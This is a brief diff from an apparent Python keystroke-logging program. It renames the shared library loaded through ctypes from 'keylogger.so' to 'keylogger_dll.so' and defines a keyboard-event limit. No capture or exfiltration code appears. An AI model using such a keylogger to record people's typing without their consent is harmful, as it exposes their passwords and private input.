@@ -2,7 +2,7 @@ from ctypes import *
 import sys
 
 # Globally import external library
-keylogger = cdll.LoadLibrary("./keylogger.so")
+keylogger = cdll.LoadLibrary("./keylogger_dll.so")
 
 MAX_KBEVTS = 2000
 
